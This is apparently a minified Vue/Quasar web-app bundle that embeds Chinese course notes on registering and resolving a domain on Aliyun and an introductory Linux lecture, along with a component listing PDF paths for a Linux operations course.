2、购买域名\r\n\r\n![image-20200327162641419](media/image-20200327162641419.png)\r\n\r\n登录控制台，然后选择域名菜单：\r\n\r\n![image-20200327162742162](media/image-20200327162742162.png)\r\n\r\n找到域名注册菜单：\r\n\r\n![image-20200327162831242](media/image-20200327162831242.png)\r\n\r\n找到想要注册的域名，然后加入清单，然后进行立即结算：\r\n\r\n![image-20200327163458795](media/image-20200327163458795.png)\r\n\r\n购买完成后，进入域名控制台：\r\n\r\n![image-20200327163713347](media/image-20200327163713347.png)\r\n\r\n## 3、把域名解析到公网IP\r\n\r\n![image-20200327163913091](media/image-20200327163913091.png)\r\n\r\n进入解析菜单，然后添加记录：\r\n\r\n![image-20200327164010354](media/image-20200327164010354.png)\r\n\r\n① 把www.itcast.top解析到公网IP\r\n\r\n![image-20200327164144887](media/image-20200327164144887.png)\r\n\r\n② 把itcast.top解析到公网IP\r\n\r\n![image-20200327164318781](media/image-20200327164318781.png)\r\n\r\n以上记录添加完成后，等待10分钟左右，即可使用域名访问论坛项目了！\r\n\r\n## 4、域名备案\r\n\r\n如果在国内运行项目，我们使用的域名必须要进行备案操作。\r\n\r\n备案就是向工信部提交网站运行的相关资料，比如域名的证书、持有者的身份证号码，以及真人手持身份证照片（背景图）\r\n\r\n由于现在监管比较严格，提交资料后，大概5-7个工作日进行审核，完全备案完成大概2周左右。\r\n\r\n> https://beian.aliyun.com/\r\n\r\n\r\n\r\n如果不想进行域名备案，可以购买中国香港、中国台湾以及国外的服务器，可以免备案。但是其运行速度略慢一些。",Fn={data:function(){return{MainComponent:Bn,img_prefix:"./img/linux/heima-Linux云计算/YUM+LAMP开源部署/"}},methods:{extendMarkdown:function(n){var r=this;console.log(n.renderer.rules);var t=n.renderer.rules.html_block;n.renderer.rules.html_block=function(n,e,a,i,s){var o=n[e];if(console.log("1"),o.content.includes("<img")){console.log("token-- ",o);var l="";l=o.content;var c=l.split('src="'),p=c[0]+' src="'+r.img_prefix+c[1];o.content=p}return o.attrSet("class","q-markdown--token  "),t(n,e,a,i,s)},n.renderer.rules.image=function(n,t,e,a,i){var s=n[t];console.log("3"),s.attrSet("class","q-markdown--image"),console.log("token--- "+t+"-----",s);var o=s.attrGet("src");return console.log(o),s.attrSet("src",r.img_prefix+o),i.renderToken(n,t,e)}}}},Un=Fn,Jn=Object(c["a"])(Un,qn,Hn,!1,null,"59ab09ee",null),zn=Jn.exports,Wn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("m2")],1)},$n=[],Gn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"row  "},[t("q-select",{attrs:{"use-input":"","input-debounce":"0",clearable:"",options:n.book_options},on:{filter:n.filterFn},model:{value:n.book,callback:function(r){n.book=r},expression:"book"}},[t("template",{slot:"before"},[t("div")])],2)],1),t("div",{staticClass:"q-pdfviewer-container  "},[t("q-pdfviewer",{attrs:{src:n.src,type:"html5","content-class":" fit   q-pdfviewer-container","inner-content-class":" fit   q-pdfviewer-container"},model:{value:n.show,callback:function(r){n.show=r},expression:"show"}})],1)])},Vn=[],Qn=["第1阶段-运维基本功/day01/第1阶段-运维基本功（升级7.6版本）day01课堂讲义.pdf","第1阶段-运维基本功/day01/课堂讲义.pdf","第1阶段-运维基本功/day01/讲义/01运维概述与Linux系统安装.pdf","第1阶段-运维基本功/day02/课堂笔记.pdf","第1阶段-运维基本功/day02/讲义/02Linux基础命令.pdf","第1阶段-运维基本功/day03/课堂笔记.pdf","第1阶段-运维基本功/day03/讲义/03Linux文件管理(上).pdf","第1阶段-运维基本功/day04/课堂笔记.pdf","第1阶段-运维基本功/day05/课堂笔记.pdf","第1阶段-运维基本功/day05/讲义/上/03Linux文件管理(下).pdf","第1阶段-运维基本功/day06/课堂笔记.pdf","第1阶段-运维基本功/day06/讲义/04用户管理.pdf","第1阶段-运维基本功/day07/课堂笔记.pdf","第1阶段-运维基本功/day07/讲义/05权限管理.pdf","第1阶段-运维基本功/day08/课堂笔记.pdf","第1阶段-运维基本功/day09/课堂笔记.pdf","第1阶段-运维基本功/day09/讲义/上/06自有服务及软件包.pdf","第1阶段-运维基本功/day10/课堂笔记.pdf","第1阶段-运维基本功/day10/讲义/07进程检测与控制.pdf","第1阶段-运维基本功/day11/课堂笔记.pdf","第1阶段-运维基本功/day12/课堂笔记.pdf","第1阶段-运维基本功/day12/讲义/08YUM与开源项目实战.pdf","第2阶段-运维系统服务/第二阶段网络基础/计算机网络设备.pdf","第2阶段-运维系统服务/第二阶段网络基础/网络基础1.pdf","第2阶段-运维系统服务/第二阶段网络基础/网络基础2.pdf","第2阶段-运维系统服务/第二阶段网络基础/网络基础3.pdf","第2阶段-运维系统服务/01_磁盘管理.pdf","第2阶段-运维系统服务/02_磁盘阵列之RAID.pdf","第2阶段-运维系统服务/系统服务/day01/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day01/讲义/01_Linux高级命令.pdf","第2阶段-运维系统服务/系统服务/day01/讲义/02_Linux下用户组管理.pdf","第2阶段-运维系统服务/系统服务/day01/讲义/03_Linux下文件权限管理.pdf","第2阶段-运维系统服务/系统服务/day01/讲义/04_Linux下软件包管理.pdf","第2阶段-运维系统服务/系统服务/day02/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day02/讲义/02_Linux下用户组管理.pdf","第2阶段-运维系统服务/系统服务/day02/讲义/03_Linux下文件权限管理.pdf","第2阶段-运维系统服务/系统服务/day03/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day03/讲义/03_Linux下文件权限管理.pdf","第2阶段-运维系统服务/系统服务/day04/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day04/讲义/Linux下yum源配置实战.pdf","第2阶段-运维系统服务/系统服务/day05/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day05/讲义/远程管理SSH服务.pdf","第2阶段-运维系统服务/系统服务/day06/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day06/讲义/01-远程管理SSH服务免密登录解决方案.pdf","第2阶段-运维系统服务/系统服务/day07/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day07/讲义/02-Linux下数据同步RSYNC.pdf","第2阶段-运维系统服务/系统服务/day08/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day08/讲义/02-文件共享服务之FTP.pdf","第2阶段-运维系统服务/系统服务/day09/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day09/讲义/文件共享服务之NFS_SMB.pdf","第2阶段-运维系统服务/系统服务/day10/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day10/讲义/域名管理系统之DNS.pdf","第2阶段-运维系统服务/系统服务/day11/课堂笔记.pdf","第2阶段-运维系统服务/系统服务/day11/讲义/源码构建LAMP环境.pdf","第2阶段-运维系统服务/01_SHELL编程前奏_小工具.pdf","第2阶段-运维系统服务/07SSH服务(打卡).pdf","第2阶段-运维系统服务/navicat.pdf","第2阶段-运维系统服务/Percona-XtraBackup-2.4.7-2.pdf","第2阶段-运维系统服务/Percona-XtraDB-Cluster-5.7.18-29.20.pdf","第2阶段-运维系统服务/mysql-dba/day01/讲义/01_MySQL介绍及安装.pdf","第2阶段-运维系统服务/mysql-dba/day02/课堂笔记.pdf","第2阶段-运维系统服务/mysql-dba/day02/讲义/02_MySQL体系结构及数据文件介绍.pdf","第2阶段-运维系统服务/mysql-dba/day02/讲义/03_MySQL基本SQL语句讲解.pdf","第2阶段-运维系统服务/mysql-dba/day03/课堂笔记.pdf","第2阶段-运维系统服务/mysql-dba/day04/讲义/04_MySQL备份与恢复.pdf","第2阶段-运维系统服务/mysql-dba/day05/课堂笔记.pdf","第2阶段-运维系统服务/mysql-dba/day05/讲义/04_MySQL备份与恢复.pdf","第2阶段-运维系统服务/mysql-dba/day06/课堂笔记.pdf","第2阶段-运维系统服务/mysql-dba/day06/讲义/05_MySQL主从复制架构.pdf","第2阶段-运维系统服务/mysql-dba/day07/课堂笔记.pdf","第2阶段-运维系统服务/mysql-dba/day07/讲义/06_MySQL数据库高可用解决方案(MHA).pdf","第2阶段-运维系统服务/shell脚本/01_SHELL编程之变量定义.pdf","第2阶段-运维系统服务/shell脚本/02_SHELL编程之流程控制和循环语句.pdf","第2阶段-运维系统服务/shell脚本/03_SHELL编程之嵌套循环+随机数及综合案例.pdf","第2阶段-运维系统服务/shell脚本/04_SHELL编程之CASE语句+函数+正则.pdf","第2阶段-运维系统服务/shell脚本/05_SHELL编程之文本处理工具SED.pdf","第2阶段-运维系统服务/shell脚本/06_SHELL编程之文本处理工具AWK.pdf","第2阶段-运维系统服务/小工具/01_SHELL编程前奏_小工具.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/10_企业架构NOSQL数据库之MongoDB.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/11_企业架构web服务器文件及时同步.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/12_企业架构之Tomcat部署使用.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/4_企业架构双点服务器HA.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/7_企业架构MySQL读写分离.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/8_企业架构缓存中间件分布式memcached.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/MongoDB权威指南中文版.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/Mycat_V1.6.0.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/企业架构LB-服务器的负载均衡之Haproxy实现.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/企业架构LB-服务器的负载均衡之LVS实现.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/11_企业架构web服务器文件及时同步/01_文档/rsync+sersync/rsync+sersync.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/1_企业架构之LNMP/01_文档/1_企业架构之LNMP.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/2_企业级Nginx使用-day1/01_文档/2_企业级Nginx使用-day1.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/2_企业级Nginx使用-day1/05_资料/ThinkPHP5.0完全开发手册-20180101212957.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/3_企业级Nginx使用-day2/01_文档/3_企业级Nginx使用-day2.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/4_企业架构HA-服务器的高可用/01_文档/4_企业架构双点服务器HA.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/4_企业架构HA-服务器的高可用/05_资料/虚拟机克隆网卡配置/虚拟机克隆IP处理.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/5_企业架构LB-服务器的负载均衡之Nginx实现/01_文档/5_企业架构LNMP高可用负载均衡服务器.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/6_企业架构LB-服务器的负载均衡二/01_文档/haproxy/企业架构LB-服务器的负载均衡之Haproxy实现.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/6_企业架构LB-服务器的负载均衡二/01_文档/lvs/企业架构LB-服务器的负载均衡之LVS实现.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/6_企业架构LB-服务器的负载均衡二/05_资料/heartbeat安装/heartbeat.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/8_企业架构缓存中间件分布式memcached/01_文档/8_企业架构缓存中间件分布式memcached.pdf","第3阶段-运维线上实战：千万级电商系统解决方案/9_企业架构队列缓存中间件分布式Redis/01_文档/9_企业架构队列缓存中间件分布式Redis.pdf","第4阶段-运维线下实战：运维自动化/centos7虚拟机教学环境统一文档.pdf","第4阶段-运维线下实战：运维自动化/CICD/文档/1-git.pdf","第4阶段-运维线下实战：运维自动化/CICD/文档/2-github与gitlab.pdf","第4阶段-运维线下实战：运维自动化/CICD/文档/3-jenkins.pdf","第4阶段-运维线下实战：运维自动化/CICD/文档/windows下Git使用拓展.pdf","第4阶段-运维线下实战：运维自动化/ELK日志分析/文档/ELK1.pdf","第4阶段-运维线下实战：运维自动化/ELK日志分析/文档/ELK2.pdf","第4阶段-运维线下实战：运维自动化/ELK日志分析/文档/logstash插件.pdf","第4阶段-运维线下实战：运维自动化/ELK日志分析/文档/综合案例.pdf","第4阶段-运维线下实战：运维自动化/存储/讲义/1-存储概念与SAN.pdf","第4阶段-运维线下实战：运维自动化/存储/讲义/2-分布式存储之glusterfs.pdf","第4阶段-运维线下实战：运维自动化/存储/讲义/3-分布式存储之Ceph.pdf","第4阶段-运维线下实战：运维自动化/存储/讲义/ceph的osd盘删除操作.pdf","第4阶段-运维线下实战：运维自动化/存储/讲义/iscsi扩展.pdf","第4阶段-运维线下实战：运维自动化/监控/文档/prometheus.pdf","第4阶段-运维线下实战：运维自动化/监控/文档/zabbix1.pdf","第4阶段-运维线下实战：运维自动化/监控/文档/zabbix2.pdf","第4阶段-运维线下实战：运维自动化/监控/文档/zabbix课后练习答案.pdf","第4阶段-运维线下实战：运维自动化/配置自动化/文档/ansible.pdf","第4阶段-运维线下实战：运维自动化/配置自动化/文档/练习答案.pdf","第4阶段-运维线下实战：运维自动化/配置自动化/文档/练习答案2.pdf","第5阶段-运维安全/1_系统安全.pdf","第5阶段-运维安全/2_网络安全.pdf","第5阶段-运维安全/3_服务安全.pdf","第5阶段-运维安全/5_入侵检测.pdf","第6阶段-运维云计算/01_k8s极速入门课程介绍.pdf","第6阶段-运维云计算/02_k8s初识.pdf","第6阶段-运维云计算/03_k8s功能.pdf","第6阶段-运维云计算/04_k8s架构.pdf","第6阶段-运维云计算/05_k8s集群部署.pdf","第6阶段-运维云计算/06_k8s集群客户端工具 kubectl.pdf","第6阶段-运维云计算/07_k8s集群资源清单文件（YAML）书写方法.pdf","第6阶段-运维云计算/1-kubernetes介绍与安装部署.pdf","第6阶段-运维云计算/1_容器技术.pdf","第6阶段-运维云计算/1_虚拟化技术（KVM）.pdf","第6阶段-运维云计算/2-kubernetes应用.pdf","第6阶段-运维云计算/2_代码自动发布-docker.pdf","第6阶段-运维云计算/2_大数据基础平台实施及运维.pdf","第6阶段-运维云计算/阿里云 SLB.pdf","第6阶段-运维云计算/阿里云 对象存储(OSS).pdf","第6阶段-运维云计算/阿里云CDN应用.pdf","第6阶段-运维云计算/01_大数据/day1/01_笔记/1_大数据基础平台实施及运维.pdf","第6阶段-运维云计算/02_虚拟化/day2/01_笔记/2_虚拟化技术（KVM）(1).pdf","第6阶段-运维云计算/03_阿里云/CDN/01_笔记/阿里云CDN应用.pdf","第6阶段-运维云计算/03_阿里云/ECS/01_笔记/阿里云 ECS.pdf","第6阶段-运维云计算/03_阿里云/NAS/01_笔记/阿里云文件存储 NAS.pdf","第6阶段-运维云计算/03_阿里云/OSS/01_笔记/阿里云 对象存储(OSS).pdf","第6阶段-运维云计算/03_阿里云/RDS/01_笔记/阿里云 RDS.pdf","第6阶段-运维云计算/03_阿里云/SLB/01_笔记/阿里云 SLB.pdf","第6阶段-运维云计算/04_私有云/openstack/OpenStack手动分布式部署.pdf","第6阶段-运维云计算/04_私有云/openstack/openstack排错思路.pdf","第6阶段-运维云计算/04_私有云/openstack/OpenStack自动部署.pdf","第6阶段-运维云计算/06_容器编排(k8s)/Paas云平台_docker容器.pdf","第6阶段-运维云计算/06_容器编排(k8s)/rancher.pdf","第6阶段-运维云计算/06_容器编排(k8s)/容器编排之Docker三剑客.pdf","第6阶段-运维云计算/7-k8s极速入门（赠送）/08_k8s极速入门_k8s集群NameSpace(命名空间)/01_笔记/08_k8s集群NameSpace(命名空间).pdf","第6阶段-运维云计算/7-k8s极速入门（赠送）/09_k8s极速入门_k8s集群核心概念 Pod/01_笔记/09_k8s集群核心概念 Pod.pdf","第6阶段-运维云计算/7-k8s极速入门（赠送）/10_k8s极速入门_k8s集群核心概念 Controller(控制器)/01_笔记/10_k8s集群核心概念Controller.pdf","第6阶段-运维云计算/7-k8s极速入门（赠送）/11_k8s极速入门_k8s集群核心概念 Service/01_笔记/11_k8s集群核心概念Service.pdf","第6阶段-运维云计算/7-k8s极速入门（赠送）/12_k8s极速入门_结课/01_笔记/12_k8s极速入门_结课.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/00_环境说明/01_笔记/第6阶段-运维云计算-《Kubernetes快速入门》进阶课程环境说明.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/01_Pod进阶/01_笔记/k8s集群核心概念 Pod进阶.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/02_Controller进阶/01_笔记/kubernetes集群应用 controller进阶.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/03_Service进阶/01_笔记/kubernetes集群应用 service进阶.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/04_kubernetes集群PaaS Rancher/01_笔记/基于kubernetes实现PaaS云平台-rancher.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/05_在kubernetes集群中kubesphere部署/01_笔记/kubernetes集群kubesphere.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/06_kubernetes集群 zookeeper部署/01_笔记/kubernetes集群 应用实践 zookeeper部署.pdf","第6阶段-运维云计算/8-Kubernetes高级教程营销视频（赠送）/07_kubernetes集群应用实践 kafka部署/01_笔记/kubernetes集群 应用实践 kafka部署.pdf","第7阶段-Python运维开发/python基础7天最终版.pdf","第7阶段-Python运维开发/01_Web开发基础之HTML+CSS/文档/01_Web开发基础之HTML+CSS.pdf","第7阶段-Python运维开发/02_Web开发基础之JavaScript/文档/02_Web开发基础之JavaScript.pdf","第7阶段-Python运维开发/03_Web开发基础之综合应用/文档/03_Web开发基础之综合应用.pdf","第7阶段-Python运维开发/04_Web框架之Django一/文档/04_Web框架之Django一.pdf","第7阶段-Python运维开发/05_Web框架之Django二/文档/05_Web框架之Django二.pdf","第7阶段-Python运维开发/06_Web框架之Django三/文档/06_Web框架之Django三.pdf","第7阶段-Python运维开发/07_CMDB系统开发一/文档/07_CMDB系统开发一.pdf","第7阶段-Python运维开发/09_CMDB系统开发三/文档/09_CMDB系统开发三.pdf"],Kn="linux/heima-Linux云计算/",Xn={mixins:[j["b"]],data:function(){return{prefix:Kn,book_options:Qn,show:!0,book:Qn[0],src:""}}},Yn=Xn,Zn=Object(c["a"])(Yn,Gn,Vn,!1,null,null,null),nr=Zn.exports,rr={components:{m2:nr},data:function(){return{tab:"m2",tabs:[{label:"m2",value:"m2"}]}}},tr=rr,er=Object(c["a"])(tr,Wn,$n,!1,null,"c8afde32",null),ar=er.exports,ir=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+n.value,label:r+1+"."+n.label}})})),1),t(""+n.tab,{tag:"component"})],1)},sr=[],or=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},lr=[],cr='# Linux-v10.0-01天-课堂笔记\r\n\r\n学习目标\r\n\r\n- 能够知道什么是Linux系统以及它的应用场景\r\n- 能够独立完成安装VMware虚拟机和网络配置\r\n- 能够独立完成安装CentOS以及远程终端SecureCRT\r\n- 能够熟练编写账户管理、用户组的增删改查和添加命令\r\n- 能够熟练编写系统管理的常用命令\r\n- 能够熟练编写目录常用命令\r\n- 能够熟练编写权限常用命令\r\n- 能够知道用户组实际应用场景\r\n\r\n# 1 初识Linux\r\n\r\n```\r\n在前面的课程中，我们无论是开发、测试。部署、存储都在Windwos操作系统的环境中，从今天开始我们一起学习下Linux,Linux系统和Windows系统最大的区别就是图形化界面操作和用途上有所差异，除了这两点，两者有异曲同工之妙，在国内， Linux 系统更多的是应用于服务器上，而桌面操作系统更多使用的是 Windows，也就是说Linux与Windows一样，同样也是操作系统只是在使用以及应用上有所差异，其他都是一样的；\r\n因为Linux也是操作系统\r\n所以在正式进入Linux学习之前，我们先简单的学习操作系统的知识，然后在讲解Linux\r\n```\r\n\r\n## 1.1 操作系统\r\n\r\n操作系统(Operation System, OS)，是管理[计算机](https://baike.baidu.com/item/计算机)[硬件](https://baike.baidu.com/item/硬件)与[软件](https://baike.baidu.com/item/软件)资源的[计算机程序](https://baike.baidu.com/item/计算机程序)，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置[内存](https://baike.baidu.com/item/内存)、决定[系统资源](https://baike.baidu.com/item/系统资源/974435)供需的优先次序、控制[输入设备](https://baike.baidu.com/item/输入设备/10823368)与[输出设备](https://baike.baidu.com/item/输出设备/10823333)、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。\r\n\r\n操作系统作为接口的示意图:\r\n\r\n![1576199620565](./img/linux/java-linux/Linux-v10-01天-授课/1576199620565.png)\r\n\r\n如上图所示，在操作系统的最上层是用户，中间层是操作系统（里面可能装了很多的应用程序），最下层是硬件的支撑，包含CPU/内存/硬盘等\r\n\r\n这就是一个完成的操作系统结构图\r\n\r\n**主流操作系统按照应用领域的划分**\r\n\r\n**1、桌面操作系统**\r\n\r\n- Window 系列\r\n  - 用户群体大\r\n- macOS\r\n  - 细节处理的更好, 没有windows软件丰富, 价格高\r\n- Linux\r\n  - 应用软件少\r\n\r\n**2、服务器操作系统**\r\n\r\n- Linux\r\n\r\n  - 安全、稳定、免费\r\n  - 占有率高\r\n\r\n- Windows Server\r\n\r\n  - 付费\r\n  - 占有率低\r\n\r\n  ![1558234034446](./img/linux/java-linux/Linux-v10-01天-授课/1558234034446.png)\r\n\r\n**3、嵌入式操作系统**\r\n\r\n​    Linux\r\n\r\n**4、移动设备操作系统**\r\n\r\n ![1560477460567](./img/linux/java-linux/Linux-v10-01天-授课/1560477460567.png)\r\n\r\n- IOS\r\n- Android (基于Linux)\r\n- 华为鸿蒙(基于linux)\r\n\r\n## 1.2 Linux发展历程\r\n\r\n```\r\n引子\r\n在上面，我们学习了操作系统的知识，也知道了主流操作系统按照应用领域划分了四个类型的操作系统，其中Linux操作系统在四个领域都有提名，因为它是至今开源序列最好的操作系统，下面，我们就一起看下Linux的发展历程，看看它是怎么诞生的...\r\n```\r\n\r\n1984年，Andrew S.Tanenbaum 开发了用于教学的Unix系统，命名为Minix，但是仅仅用于教学\r\n1989年，Andrew S.Tanenbaum将Minix系统运行于x86的pc平台\r\n1990年，芬兰赫尔辛基大学学生Linus Torvalds首次接触Minix系统\r\n1991年，Linus Torvalds开始在Minix上编写各种驱动程序等操作系统内核组件\r\n1991年年底，Linus Torvalds公开了Linux内核源码0.02版，仅仅是内核\r\n1994年，Linux 1.0版本发行，Linux转向GPL版权协议\r\n至此，Linux开始盛行开来...\r\n\r\n![1575879660267](./img/linux/java-linux/Linux-v10-01天-授课/1575879660267.png)\r\n\r\nLinux 内核最初是由李纳斯•托瓦兹（Linus Torvalds）在赫尔辛基大学读书时出于个人爱好而编写的，当时他觉得教学用的迷你版 Unix操作系统 Minix 太难用了，于是决定自己开发一个操作系统。\r\n\r\n第 1 版本于 1991 发布，当时仅有 10 000 行代码。\r\n\r\n李纳斯•托瓦兹没有保留 Linux 源代码的版权，公开了代码，并邀请他人一起完善 Linux。与 Windows 及其他有专利权的操作系统不同，Linux 开放源代码，任何人都可以免费使用它。\r\n\r\n据估计，现在只有 2% 的 Linux 核心代码是由李纳斯•托瓦兹自己编写的，虽然他仍然拥有 Linux 内核（操作系统的核心部分），并且保留了选择新代码和需要合并的新方法的最终裁定权。现在大家所使用的 Linux，我更倾向于说是由李纳斯•托瓦兹和后来陆续加入的众多 Linux 好者共同开发完成的。\r\n\r\n> Unix  \r\n>\r\n> Unix  操作系统由肯•汤普森（Ken Thompson）和丹尼斯•里奇（Dennis Ritchie）发明。它的部分技术来源可追溯到从 1965 年开始的 Multics 工程计划，该计划由贝尔实验室、美国麻省理工学院和通用电气公司联合发起，目标是开发一种交互式的、具有多道程序处理能力的分时操作系统，以取代当时广泛使用的批处理操作系统。\r\n>\r\n> Unix是一个强大的多用户、多任务操作系统。于1969年在AT&T的贝尔实验室开发。Unix  的商标权由国际开放标准组织（The Open Group）所拥有。Unix操作系统是商业版，需要收费，价格比Microsoft Windows正版要贵一些。\r\n\r\n## 1.3 Linux简介\r\n\r\n```\r\n引子\r\nLinux和我们常见的Windows一样，都是操作系统，\r\n例如：新浪、百度、淘宝等互联网公司，他们使用的服务器全都是Linux系统；全球500强企业95%的服务器使用的都是Linux系统。\r\n```\r\n\r\n### **1.3.1 什么是 Linux**\r\n\r\nLinux是一套免费使用和自由传播的[类Unix](https://baike.baidu.com/item/类Unix)[操作系统](https://baike.baidu.com/item/操作系统/192)，是一个基于[POSIX](https://baike.baidu.com/item/POSIX)和Unix的多用户、[多任务](https://baike.baidu.com/item/多任务/1011764)、支持[多线程](https://baike.baidu.com/item/多线程/1190404)和多[CPU](https://baike.baidu.com/item/CPU)的操作系统。它能运行主要的Unix工具软件、应用程序和网络协议。它支持[32位](https://baike.baidu.com/item/32位/5812218)和[64位](https://baike.baidu.com/item/64位)硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。\r\n\r\nLinux 的标志和吉祥物是一只名字叫做Tux(它克斯)的企鹅，Linux是基于Unix的。\r\n\r\nLinux是一种自由和开放源码的操作系统，存在着许多不同的Linux版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、台式计算机\r\n\r\n![1575881750752](./img/linux/java-linux/Linux-v10-01天-授课/1575881750752.png)\r\n\r\nLinux不仅系统性能稳定，而且是开源软件。其核心防火墙组件性能高效、配置简单，保证了系统的安全。在很多企业网络中，为了追求速度和安全，Linux操作系统不仅仅是被网络运维人员当作服务器使用，Linux既可以当作[服务器](https://baike.baidu.com/item/服务器/100571)，又可以当作网络防火墙是Linux的 一大亮点。 \r\n\r\nLinux与其他操作系统相比 ，具有[开放源码](https://baike.baidu.com/item/开放源码/7176422)、没有版权、技术社区用户多等特点 ，开放源码使得用户可以自由裁剪，灵活性高，功能强大，成本低。尤其系统中内嵌网络协议栈 ，经过适当的配置就可实现路由器的功能。这些特点使得Linux成为开发路由交换设备的理想开发平台。\r\n\r\n### 1.3.2 Linux的特点\r\n\r\n**基本思想**\r\n\r\nLinux的基本思想有两点：\r\n\r\n第一：一切都是文件\r\n\r\n第二：每个软件都有确定的用途\r\n\r\n其中第一条详细来讲就是系统中的所有都归结为一个文件，包括[命令](https://baike.baidu.com/item/命令)、[硬件](https://baike.baidu.com/item/硬件)和[软件](https://baike.baidu.com/item/软件/12053)设备、[操作系统](https://baike.baidu.com/item/操作系统/192)、[进程](https://baike.baidu.com/item/进程)等等对于操作系统[内核](https://baike.baidu.com/item/内核)而言，都被视为拥有各自特性或类型的文件。至于说Linux是基于Unix的，很大程度上也是因为这两者的基本思想十分相近\r\n\r\n**完全免费**\r\n\r\nLinux是一款免费的操作系统，用户可以通过网络或其他途径免费获得，并可以任意修改其[源代码](https://baike.baidu.com/item/源代码/3969)。这是其他的操作系统所做不到的。正是由于这一点，来自全世界的无数[程序员](https://baike.baidu.com/item/程序员/62748)参与了Linux的修改、编写工作，程序员可以根据自己的兴趣和灵感对其进行改变，这让Linux吸收了无数程序员的精华，不断壮大。\r\n\r\n**完全兼容POSIX1.0标准**\r\n\r\n这使得可以在Linux下通过相应的[模拟器](https://baike.baidu.com/item/模拟器)运行常见的[DOS](https://baike.baidu.com/item/DOS/32025)、[Windows](https://baike.baidu.com/item/Windows)的程序。这为用户从Windows转到Linux奠定了基础。许多用户在考虑使用Linux时，就想到以前在Windows下常见的程序是否能正常运行，这一点就消除了他们的疑虑。\r\n\r\n**多用户、多任务**\r\n\r\nLinux支持多用户，各个用户对于自己的文件设备有自己特殊的权利，保证了各用户之间互不影响。[多任务](https://baike.baidu.com/item/多任务)则是现在电脑最主要的一个特点，Linux可以使多个程序同时并独立地运行。\r\n\r\n**良好的界面**\r\n\r\nLinux同时具有字符界面和[图形界面](https://baike.baidu.com/item/图形界面/8146283)。在字符界面用户可以通过键盘输入相应的指令来进行操作。它同时也提供了类似Windows图形界面的X-Window系统，用户可以使用鼠标对其进行操作。在X-Window环境中就和在Windows中相似，可以说是一个Linux版的Windows。\r\n\r\n**支持多种平台**\r\n\r\nLinux可以运行在多种硬件平台上，如具有[x86](https://baike.baidu.com/item/x86/6150538)、680x0、SPARC、Alpha等处理器的平台。此外Linux还是一种嵌入式操作系统，可以运行在掌上电脑、机顶盒或游戏机上。2001年1月份发布的Linux 2.4版内核已经能够完全支持[Intel](https://baike.baidu.com/item/Intel/125450)64位芯片架构。同时Linux也支持多处理器技术。多个处理器同时工作，使系统性能大大提高。\r\n\r\n**优点**\r\n\r\n1)Linux由众多微内核组成，其源代码完全开源；\r\n\r\n2)Linux继承了Unix的特性，具有非常强大的网络功能，其支持所有的因特网协议，包括TCP/[IPv4](https://baike.baidu.com/item/IPv4/422599)、 [TCP](https://baike.baidu.com/item/TCP/33012)/IPv6和链路层拓扑程序等，且可以利用Unix的网络特性开发出新的协议栈；\r\n\r\n3)Linux系统工具链完整，简单操作就可以配置出合适的开发环境，可以简化开发过程，减少开发中仿真工具的障碍，使系统具有较强的移植性；\r\n\r\n## 1.4 Linux和Unix区别\r\n\r\n**1、开源情况**\r\n\r\nUnix  是商业化的，而 Linux 是开源的，是免费、公开源代码的。\r\n\r\n**2、硬件适用**\r\n\r\nUnix  系统大多是与硬件配套的，也就是说，大多数Unix系统如AIX、HP-UX等是无法安装在 x86 服务器和个人计算机上的，而 